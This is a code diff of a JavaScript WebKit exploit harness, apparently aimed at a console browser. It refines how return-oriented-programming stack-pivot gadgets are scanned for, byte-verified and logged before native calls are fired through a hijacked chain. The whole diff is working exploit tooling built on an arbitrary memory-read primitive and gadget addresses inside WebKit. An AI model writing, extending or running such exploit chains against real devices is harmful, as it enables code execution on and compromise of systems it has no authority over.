@@ -69,12 +69,12 @@ import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke,
     layoutSmokeStack, layoutGetpidStack, bisectArmG0, bisectHookPivot, bisectHookPivotPoops,
-    bisectFireExpm1,     bisectRestore, fireNativeCallBisect, verifyFullChainSet, describeSlabLayout,
+    bisectFireExpm1,     bisectRestore, fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
     patchPrepG5, verifySlabAddrs, probePivotCell, bisectHookPivotAt, bisectHookPivotMulti,
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830ah";
+const BUILD_ID = "rw-20250830ai";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
@@ -377,7 +377,7 @@ function updatePivotReady(p, off) {
         pivotReady = false;
         return null;
     }
-    const v = verifyPivotSet(addr => read1p(p, addr), webkitBase, off);
+    const v = verifyBisectChainSet(addr => read1p(p, addr), webkitBase, off);
     pivotReady = v.ok;
     return v;
 }
@@ -734,7 +734,7 @@ function gateNativeFire(p, off) {
         mark("NATIVE-SKIP", "no webkitBase — Start first");
         return false;
     }
-    const v = verifyFullChainSet(addr => read1p(p, addr), wb, off);
+    const v = verifyBisectChainSet(addr => read1p(p, addr), wb, off);
     if (!v.ok) {
         mark("NATIVE-SKIP", "chain not verified — tap Verify pivot (G0-G5 + POP bytes)");
         if (v.pivot.bad.length)
@@ -746,6 +746,11 @@ function gateNativeFire(p, off) {
         else if (v.popMissing.length)
             mark("POP-MISS", v.popMissing.join(", "));
         return false;
+    }
+    if (params.get("fullverify") === "1") {
+        const vf = verifyFullChainSet(addr => read1p(p, addr), wb, off);
+        if (!vf.ok && vf.pivot.bad.length)
+            mark("PIVOT-FULL-WARN", vf.pivot.bad.join(", ") + " — prefix OK, poops tail may OOM N5");
     }
     return true;
 }
@@ -1189,10 +1194,7 @@ function runManualTest(testId) {
         pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
     if (test.group === "pivot" && testId !== "g5") {
         const row = pivotRowByLabel(test.label);
-        if (row) {
-            const exec = pivotExecPattern(row[0], off);
-            if (exec) pat = exec;
-        }
+        if (row) pat = pivotPattern(row, off);
     }
     if (rva == null && test.group === "pivot") {
         if (testId === "g5") {
@@ -1932,10 +1934,8 @@ function pivotScanRange(key, phase, found) {
     };
 }
 
-function pivotScanPatterns(label, pat, off) {
+function pivotScanPatterns(label, pat) {
     if (label === "G5") return G5_PATTERNS.map(g => g.pat);
-    const exec = pivotExecPattern(label, off || loadEffectiveOff());
-    if (exec) return [exec];
     return [pat];
 }
 
@@ -1944,7 +1944,7 @@ function pivotStartPhase(label) {
 }
 
 function pivotScanFoundInit() {
-    const found = {};
+    const found = Object.assign({}, PIVOT_HW_1352);
     const full = loadPivotFullOverride();
     if (full) Object.assign(found, full);
     const saved = loadScannedPivot();
@@ -2047,6 +2047,19 @@ function pivotRowByKey(key) {
     return null;
 }
 
+/** True when gadget at effective RVA passes prefix-byte check (HW scan method). */
+function pivotRowPrefixOk(p, webkitBase, off, row) {
+    if (!p || !webkitBase || !row) return false;
+    const label = row[0];
+    const key = row[1];
+    const rva = off[key];
+    if (rva == null) return false;
+    const read1 = a => read1p(p, a);
+    if (label === "G5") return !!checkG5Bytes(read1, webkitBase, rva);
+    const pat = pivotPattern(row, off);
+    return checkPivotBytes(read1, webkitBase, rva, pat);
+}
+
 /** True when gadget at effective RVA passes full execution-byte check. */
 function pivotRowVerifyOk(p, webkitBase, off, row) {
     if (!p || !webkitBase || !row) return false;
@@ -2060,12 +2073,12 @@ function pivotRowVerifyOk(p, webkitBase, off, row) {
     return checkPivotBytes(read1, webkitBase, rva, pat);
 }
 
-function pivotRowsNeedingFullScan(p, webkitBase, off) {
+function pivotRowsNeedingPrefixScan(p, webkitBase, off) {
     const out = [];
     for (let i = 0; i < PIVOT_ROWS.length; i++) {
         const row = PIVOT_ROWS[i];
         if (row[0] === "MOV_RDI_RAX") continue;
-        if (pivotRowVerifyOk(p, webkitBase, off, row)) continue;
+        if (pivotRowPrefixOk(p, webkitBase, off, row)) continue;
         out.push(row);
     }
     return out;
@@ -2077,7 +2090,7 @@ function pivotRowDone(found, key, p, webkitBase, off) {
     const rva = found[key] != null ? found[key] : (off && off[key]);
     if (rva == null) return false;
     const offTry = Object.assign({}, off, { [key]: rva });
-    return pivotRowVerifyOk(p, webkitBase, offTry, row);
+    return pivotRowPrefixOk(p, webkitBase, offTry, row);
 }
 
 function advancePivotRowIdx(pivotScan, p, webkitBase, off) {
@@ -2111,7 +2124,7 @@ function preparePivotScan(webkitBase, p) {
     for (let i = 0; i < PIVOT_ROWS.length; i++) {
         const row = PIVOT_ROWS[i];
         if (row[0] === "MOV_RDI_RAX") continue;
-        if (!pivotRowVerifyOk(p, webkitBase, off, row)) {
+        if (!pivotRowPrefixOk(p, webkitBase, off, row)) {
             rowIdx = i;
             break;
         }
@@ -2169,8 +2182,8 @@ async function scanPivotRowPhase(p, webkitBase, off) {
     const key = row[1];
     const label = row[0];
     const offScan = loadEffectiveOff();
-    const pat = pivotExecPattern(label, offScan) || pivotPattern(row, offScan);
-    const pats = pivotScanPatterns(label, pat, offScan);
+    const pat = pivotPattern(row, offScan);
+    const pats = pivotScanPatterns(label, pat);
     const patKinds = label === "G5" ? G5_PATTERNS.map(g => g.kind) : null;
     if (!pivotScan.phase) pivotScan.phase = pivotStartPhase(label);
     const range = pivotScanRange(key, pivotScan.phase, pivotScan.found);
@@ -2267,7 +2280,8 @@ async function scanPivotRowPhase(p, webkitBase, off) {
         } else {
             mark("SCAN-HIT", label + " +0x" + hit.rva.toString(16)
                 + " phase=" + pivotScan.phase
-                + (hint ? " hint=+0x" + hint.toString(16) : ""));
+                + (hint ? " hint=+0x" + hint.toString(16) : "")
+                + " bytes=" + gadgetBytesHex(p, webkitBase, hit.rva, 16));
         }
         pivotScan.rowIdx++;
         pivotScan.phase = pivotStartPhase(
@@ -2435,14 +2449,14 @@ async function runPivotScanAuto() {
     }
 
     preparePivotScan(webkitBase, p);
-    const needs = pivotRowsNeedingFullScan(p, webkitBase, off);
+    const needs = pivotRowsNeedingPrefixScan(p, webkitBase, off);
     if (needs.length === 0) {
         mark("SCAN-SKIP", "all pivot gadgets verify — tap Verify pivot");
         verifyPivotManual();
         return;
     }
     state("scanning " + needs.map(r => r[0]).join(", ") + "…", "warn");
-    mark("SCAN-AUTO", "full-pattern rescan: " + needs.map(r => r[0]).join(", ")
+    mark("SCAN-AUTO", "prefix scan: " + needs.map(r => r[0]).join(", ")
         + " — chunked " + SCAN_CHUNK_STEPS + " steps/tick — tap Stop to cancel");
 
     await runPivotScanLoop(false);
@@ -2455,7 +2469,7 @@ async function scanPivotChunk() {
 function verifyPivotManual(fromScan) {
     if (!ready || !window.p || busy) return;
     const p = window.p;
-    let off = loadEffectiveOff();
+    const off = loadEffectiveOff();
     const webkitBase = chainWebkitBase(off);
     if (!webkitBase) {
         mark("PIVOT-SKIP", "no webkitBase — Save bases first");
@@ -2469,38 +2483,26 @@ function verifyPivotManual(fromScan) {
     mark("PIVOT-CHECK", "G5="
         + (g5rva != null ? "+0x" + g5rva.toString(16) : "not set — HW +0x13ec77a")
         + " wb=" + webkitBase);
-    const v = verifyFullChainSet(addr => read1p(p, addr), webkitBase, off);
+    const vFull = verifyFullChainSet(addr => read1p(p, addr), webkitBase, off);
+    const v = verifyBisectChainSet(addr => read1p(p, addr), webkitBase, off);
     if (v.pivot.missing.length)
         mark("PIVOT-MISS", v.pivot.missing.join(", ") + " — tap a G5 button above");
-    if (v.pivot.bad.length) {
-        mark("PIVOT-BAD", v.pivot.bad.join(", ") + " — bytes mismatch at RVA");
-        logPivotBadBytes(p, webkitBase, off, v.pivot.bad);
-        const needScan = v.pivot.bad.filter(b => {
-            const lab = b.split(" ")[0];
-            return lab !== "G5" && lab !== "MOV_RDI_RAX";
-        });
-        if (needScan.length) {
-            mark("PIVOT-HINT", "G0-G4 bad — tap Scan pivot (auto) for chunked full scan (do NOT rescan from Verify)");
-            scanPivotFullNearOnly(p, webkitBase, off, needScan, 512);
-            off = loadEffectiveOff();
-            const vNear = verifyFullChainSet(addr => read1p(p, addr), webkitBase, off);
-            if (vNear.ok) {
-                mark("PIVOT-READY", vNear.pivot.count + "/" + vNear.pivot.total
-                    + " pivot + " + vNear.popGood.length + " pop (near hit)");
-                pivotReady = true;
-                state("chain OK — bisect N2→N5 or Fire smoke", "ok");
-                setUi();
-                return;
-            }
-            if (vNear.pivot.good.length)
-                mark("PIVOT-OK", vNear.pivot.good.join(", "));
-            state("G0-G4 need Scan pivot (auto)", "warn");
-            setUi();
-            return;
-        }
+    const prefixBad = v.pivot.bad.filter(b => !b.includes("("));
+    const fullOnlyBad = vFull.pivot.bad.filter(b => b.includes("prefix-only"));
+    if (prefixBad.length) {
+        mark("PIVOT-BAD", prefixBad.join(", ") + " — prefix bytes mismatch at RVA");
+        logPivotBadBytes(p, webkitBase, off, prefixBad);
+        mark("PIVOT-HINT", "tap Scan pivot (auto) for chunked prefix rescan");
+    }
+    if (fullOnlyBad.length) {
+        mark("PIVOT-FULL-BAD", fullOnlyBad.map(b => b.split(" ")[0]).join(", ")
+            + " — prefix OK, poops tail differs (N5 may OOM)");
+        logPivotBadBytes(p, webkitBase, off, fullOnlyBad);
     }
     if (v.pivot.good.length)
-        mark("PIVOT-OK", v.pivot.good.join(", "));
+        mark("PIVOT-PREFIX-OK", v.pivot.good.join(", "));
+    if (vFull.pivot.good.length && !vFull.ok)
+        mark("PIVOT-FULL-OK", vFull.pivot.good.join(", "));
     if (v.popBad.length) {
         mark("POP-BAD", v.popBad.join(", ") + " — needed for smoke chain @ wb=" + webkitBase);
         logPopBadBytes(p, webkitBase, off, v.popBad);
@@ -2511,8 +2513,10 @@ function verifyPivotManual(fromScan) {
     pivotReady = v.ok;
     if (v.ok) {
         mark("PIVOT-READY", v.pivot.count + "/" + v.pivot.total
-            + " pivot + " + v.popGood.length + " pop");
-        state("chain OK — bisect N2→N5 or Fire smoke", "ok");
+            + " prefix pivot + " + v.popGood.length + " pop");
+        if (!vFull.ok)
+            mark("PIVOT-FULL-WARN", "bisect unlocked on prefix — N5 may OOM until full poops bytes match");
+        state("chain OK (prefix) — bisect N2→N5 or Fire smoke", "ok");
     } else {
         state("chain not ready — " + pivotNotReadyMsg(v.pivot), "warn");
     }
